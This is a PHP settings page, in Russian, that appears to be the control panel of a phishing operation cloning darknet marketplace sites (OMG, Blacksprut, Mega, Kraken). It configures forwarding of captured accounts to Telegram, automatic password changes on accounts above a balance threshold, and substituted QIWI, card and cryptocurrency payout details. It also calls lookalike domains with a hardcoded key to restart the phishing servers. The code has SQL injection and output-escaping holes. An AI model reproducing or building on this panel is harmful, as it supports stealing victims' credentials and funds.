<?php 

$get_conf_type = isset($_POST['config-type']) && in_array($_POST['config-type'], ['main', 'omg', 'blacksprut', 'mega', 'kraken']) ? $_POST['config-type'] : '';

if ($get_conf_type) {
	if (!empty($_POST['newpassword'])) {
		$newpass = password_hash($_POST['newpassword'], PASSWORD_DEFAULT);
		$db->query("UPDATE `users` SET `password` = '{$newpass}' WHERE `id` = {$user_id}");
	}
	unset($_POST['newpassword']);
	$save = $db->real_escape_string( json_encode($_POST) );
	$check_tec_conf = $db->query("SELECT * FROM `user_config` WHERE `user_id` = {$user_info['id']} AND `name` LIKE '{$get_conf_type}'")->fetch_assoc();
	if ($check_tec_conf['id']) {
		$db->query("UPDATE `user_config` SET `info` = '{$save}' WHERE `id` = {$check_tec_conf['id']}");
	} else {
		$db->query("INSERT INTO `user_config` (`id`, `user_id`, `user_login`, `info`, `name`) VALUES (NULL, '{$user_info['id']}', '{$user_info['login']}', '{$save}', '{$get_conf_type}')");
	}
	$save_text = '<p class="alert">Настройки сохранены</p>';
} elseif (isset($_POST['config-type'])) {
	$save_text = '<p class="alert">Произошла какая то ошибка</p>';
}


if (isset($_GET['reload']) && in_array($_GET['site'], ['omg', 'blacksprut', 'mega', 'kraken'])) {
	$sites_ip = [ 'omg' => 'omg-mrkt.com', 'blacksprut' => 'bcs-mrkt.com', 'mega' => '', 'kraken' => 'krakenmarket.info' ];
	$get_cont = file_get_contents("http://{$sites_ip[$_GET['site']]}/reload.php?type={$_GET['reload']}&key=kfkeiEsxXaAsdzcVVdDs");
	if ($get_cont == '1') {
		$save_text = '<p class="alert">'.$_GET['reload'].' сайта '.$_GET['site'].' перезагружен</p>';
	} else {
		$save_text = '<p class="alert">Произошла какая то ошибка</p>';
	}
}


?>



<h2>Настройки сайта</h2>

<?= $save_text; ?>


<div class="tablist">
	<a href="javascript:;" class="active">Общие</a>
<?php 
if (isset($perm_conf['omg'])) echo '<a href="javascript:;">Omg</a>';
if (isset($perm_conf['blacksprut'])) echo '<a href="javascript:;">Blacksprut</a>';
if (isset($perm_conf['mega'])) echo '<a href="javascript:;">Mega</a>';
if (isset($perm_conf['kraken'])) echo '<a href="javascript:;">Kraken</a>';




$get_main_config = $db->query("SELECT * FROM `user_config` WHERE `user_id` = {$user_info['id']} AND `name` LIKE 'main'")->fetch_assoc();
if (isset($get_main_config['id'])) {
	$get_main_config = json_decode($get_main_config['info'], true);
} else {
	$get_main_config = [];
}

?>
</div>
<br><br>

<div class="tabcontent">

<form action="/?page=sitesetting" method="post" style="display: block;">
	<input type="text" name="config-type" value="main" hidden>
	<div class="form-controll">
		<p>Ваш логин</p>
		<input type="text" name="" value="<?= $user_info['login']; ?>" readonly>
	</div>
	<div class="form-controll">
		<p>APi Telegram</p>
		<input type="text" name="telegram-api" value="<?= $get_main_config['telegram-api']; ?>">
	</div>
	<div class="form-controll">
		<p>ID Telegram</p>
		<input type="text" name="telegram-id" value="<?= $get_main_config['telegram-id']; ?>">
	</div>

	<div class="form-controll">
		<p>Telegram</p>
		<input type="text" name="teelegram" value="<?= $get_main_config['teelegram']; ?>">
	</div>
	<div class="form-controll">
		<p>Новый пароль</p>
		<input type="text" name="newpassword" value="">
	</div>

	<div class="form-controll">
		<button type="submit">Сохранить</button>
	</div>

</form>


<?php
if (isset($perm_conf['omg'])):

$get_omg_config = $db->query("SELECT * FROM `user_config` WHERE `user_id` = {$user_info['id']} AND `name` LIKE 'omg'")->fetch_assoc();
if (isset($get_omg_config['id'])) {
	$get_omg_config = json_decode($get_omg_config['info'], true);
} else {
	$get_omg_config = [];
}

?>

<style>
	.reload-buttons {	
		margin-bottom: 20px;
	}
	.reload-buttons > a {
		    background: #343333;
    color: #fff;
    padding: 5px 15px;
    border-radius: 5px;
    transition: background 0.4s	;
	}
	.reload-buttons > a:hover {
		background: #000;
	}
</style>


<form action="/?page=sitesetting" method="post">
	<input type="text" name="config-type" value="omg" hidden>

	<div class="reload-buttons">
		<a href="?page=sitesetting&reload=apache&site=omg">Restart Apache</a>
		<a href="?page=sitesetting&reload=tor&site=omg">Restart Tor</a>
	</div>

	<div class="form-checkbox"> 
	  <label>
	  	<p>Дублировать аккаунты если аккаунт есть в БД </p>
	    <input type="checkbox" name="dublicat-acc" <?= checkbox($get_omg_config['dublicat-acc']); ?>>
	    <span></span>
	  </label>
	</div>


	<div class="form-checkbox"> 
	  <label>
	  	<p>Отправлять аккаунты в ТГ </p>
	    <input type="checkbox" name="sendacctelegram" <?= checkbox($get_omg_config['sendacctelegram']); ?>>
	    <span></span>
	  </label>
	</div>


	<div class="form-checkbox"> 
	  <label>
	  	<p>Отправлять не валидные аккаунты в ТГ </p>
	    <input type="checkbox" name="sendbad" <?= checkbox($get_omg_config['sendbad']); ?>> 
	    <span></span>
	  </label>
	</div>


	<div class="form-checkbox"> 
	  <label>
	  	<p>Записывать не валидные аккаунты </p>
	    <input type="checkbox" name="savebad" <?= checkbox($get_omg_config['savebad']); ?>>
	    <span></span>
	  </label>
	</div>





<?php
if (isset($perm_conf['omg']['local'])) {
?>

	<div class="form-checkbox"> 
	  <label>
	  	<p>Включить локальную версию сайта</p>
	    <input type="checkbox" name="localomg" <?= checkbox($get_omg_config['localomg']); ?>>
	    <span></span>
	  </label>
	</div>
<?php
}
?>

	<div class="form-checkbox"> 
	  <label>
	  	<p>Включить смену пароля</p>
	    <input type="checkbox" name="changepass" <?= checkbox($get_omg_config['changepass']); ?>>
	    <span></span>
	  </label>
	</div>

	<div class="form-controll">
		<p>Минимальная сумма для смены пароля</p>
		<input type="text" name="min-summ" value="<?= $get_omg_config['min-summ']; ?>">
	</div>


	<div class="form-controll">
		<p>QIWI кошелек</p>
		<input type="text" name="qiwi" value="<?= $get_omg_config['qiwi']; ?>">
	</div>
	<div class="form-controll">
		<p>Мобильный номер</p>
		<input type="text" name="mobile" value="<?= $get_omg_config['mobile']; ?>">
	</div>
	<div class="form-controll">
		<p>Номер карты</p>
		<input type="text" name="card-number" value="<?= $get_omg_config['card-number']; ?>"> 
	</div>
	<div class="form-controll">
		<p>Bitcoin кошелек</p>
		<input type="text" name="bitcoin" value="<?= $get_omg_config['bitcoin']; ?>">
	</div>









	<div class="form-controll">
		<button type="submit">Сохранить</button>
	</div>

</form>
<?php
endif;
?>











<?php
if (isset($perm_conf['blacksprut'])):
$get_blacksprut_config = $db->query("SELECT * FROM `user_config` WHERE `user_id` = {$user_info['id']} AND `name` LIKE 'blacksprut'")->fetch_assoc();
if (isset($get_blacksprut_config['id'])) {
	$get_blacksprut_config = json_decode($get_blacksprut_config['info'], true);
	    
} else {
	$get_blacksprut_config = [];
}	
?>

<form action="/?page=sitesetting" method="post">
	<input type="text" name="config-type" value="blacksprut" hidden>
	<div class="reload-buttons">
		<a href="?page=sitesetting&reload=apache&site=blacksprut">Restart Apache</a>
		<a href="?page=sitesetting&reload=tor&site=blacksprut">Restart Tor</a>
	</div>

	<div class="form-checkbox"> 
	  <label>
	  	<p>Дублировать аккаунты если аккаунт есть в БД </p>
	    <input type="checkbox" name="dublicat-acc" <?= checkbox($get_blacksprut_config['dublicat-acc']); ?>>
	    <span></span>
	  </label>
	</div>

	<div class="form-checkbox"> 
	  <label>
	  	<p>Отправлять аккаунты в ТГ </p>
	    <input type="checkbox" name="sendacctelegram" <?= checkbox($get_blacksprut_config['sendacctelegram']); ?>>
	    <span></span>
	  </label>
	</div>





	<div class="form-controll">
		<p>QIWI кошелек</p>
		<input type="text" name="qiwi" value="<?= $get_blacksprut_config['qiwi']; ?>">
	</div>
	<div class="form-controll">
		<p>Мобильный номер</p>
		<input type="text" name="mobile" value="<?= $get_blacksprut_config['mobile']; ?>">
	</div>
	<div class="form-controll">
		<p>Номер карты</p>
		<input type="text" name="card-number" value="<?= $get_blacksprut_config['card-number']; ?>"> 
	</div>
	<div class="form-controll">
		<p>Bitcoin кошелек</p>
		<input type="text" name="bitcoin" value="<?= $get_blacksprut_config['bitcoin']; ?>">
	</div>

	<div class="form-controll">
		<p>XMR кошелек</p>
		<input type="text" name="xmr" value="<?= $get_blacksprut_config['xmr']; ?>">
	</div>








	<div class="form-controll">
		<button type="submit">Сохранить</button>
	</div>

</form>
<?php
endif;
?>








<?php
if (isset($perm_conf['mega'])):
$get_mega_config = $db->query("SELECT * FROM `user_config` WHERE `user_id` = {$user_info['id']} AND `name` LIKE 'mega'")->fetch_assoc();
if (isset($get_mega_config['id'])) {
	$get_mega_config = json_decode($get_mega_config['info'], true);
} else {
	$get_mega_config = [];
}	
?>

<form action="/?page=sitesetting" method="post">
	<input type="text" name="config-type" value="mega" hidden>
	<div class="reload-buttons">
		<a href="?page=sitesetting&reload=apache&site=mega">Restart Apache</a>
		<a href="?page=sitesetting&reload=tor&site=mega">Restart Tor</a>
	</div>

	<div class="form-checkbox"> 
	  <label>
	  	<p>Дублировать аккаунты если аккаунт есть в БД </p>
	    <input type="checkbox" name="dublicat-acc" <?= checkbox($get_mega_config['dublicat-acc']); ?>>
	    <span></span>
	  </label>
	</div>

	<div class="form-checkbox"> 
	  <label>
	  	<p>Отправлять аккаунты в ТГ </p>
	    <input type="checkbox" name="sendacctelegram" <?= checkbox($get_mega_config['sendacctelegram']); ?>>
	    <span></span>
	  </label>
	</div>





	<div class="form-controll">
		<p>QIWI кошелек</p>
		<input type="text" name="qiwi" value="<?= $get_mega_config['qiwi']; ?>">
	</div>
	<div class="form-controll">
		<p>Мобильный номер</p>
		<input type="text" name="mobile" value="<?= $get_mega_config['mobile']; ?>">
	</div>
	<div class="form-controll">
		<p>Номер карты</p>
		<input type="text" name="card-number" value="<?= $get_mega_config['card-number']; ?>"> 
	</div>
	<div class="form-controll">
		<p>Bitcoin кошелек</p>
		<input type="text" name="bitcoin" value="<?= $get_mega_config['bitcoin']; ?>">
	</div>

	<div class="form-controll">
		<p>XMR кошелек</p>
		<input type="text" name="xmr" value="<?= $get_mega_config['xmr']; ?>">
	</div>


	<div class="form-controll">
		<p>USDT кошелек</p>
		<input type="text" name="usdt" value="<?= $get_mega_config['usdt']; ?>">
	</div>


	<div class="form-controll">
		<button type="submit">Сохранить</button>
	</div>

</form>
<?php
endif;
?>








<?php
if (isset($perm_conf['kraken'])):
$get_kraken_config = $db->query("SELECT * FROM `user_config` WHERE `user_id` = {$user_info['id']} AND `name` LIKE 'kraken'")->fetch_assoc();
if (isset($get_kraken_config['id'])) {
	$get_kraken_config = json_decode($get_kraken_config['info'], true);
} else {
	$get_kraken_config = [];
}	
?>

<form action="/?page=sitesetting" method="post">
	<input type="text" name="config-type" value="kraken" hidden>
	<div class="reload-buttons">
		<a href="?page=sitesetting&reload=apache&site=kraken">Restart Apache</a>
		<a href="?page=sitesetting&reload=tor&site=kraken">Restart Tor</a>
	</div>

	<div class="form-checkbox"> 
	  <label>
	  	<p>Дублировать аккаунты если аккаунт есть в БД </p>
	    <input type="checkbox" name="dublicat-acc" <?= checkbox($get_kraken_config['dublicat-acc']); ?>>
	    <span></span>
	  </label>
	</div>

	<div class="form-checkbox"> 
	  <label>
	  	<p>Отправлять аккаунты в ТГ </p>
	    <input type="checkbox" name="sendacctelegram" <?= checkbox($get_kraken_config['sendacctelegram']); ?>>
	    <span></span>
	  </label>
	</div>





	<div class="form-controll">
		<p>QIWI кошелек</p>
		<input type="text" name="qiwi" value="<?= $get_kraken_config['qiwi']; ?>">
	</div>
	<div class="form-controll">
		<p>Мобильный номер</p>
		<input type="text" name="mobile" value="<?= $get_kraken_config['mobile']; ?>">
	</div>
	<div class="form-controll">
		<p>Номер карты</p>
		<input type="text" name="card-number" value="<?= $get_kraken_config['card-number']; ?>"> 
	</div>
	<div class="form-controll">
		<p>Bitcoin кошелек</p>
		<input type="text" name="bitcoin" value="<?= $get_kraken_config['bitcoin']; ?>">
	</div>

	<div class="form-controll">
		<p>XMR кошелек</p>
		<input type="text" name="xmr" value="<?= $get_kraken_config['xmr']; ?>">
	</div>




	<div class="form-controll">
		<button type="submit">Сохранить</button>
	</div>

</form>
<?php
endif;
?>





</div>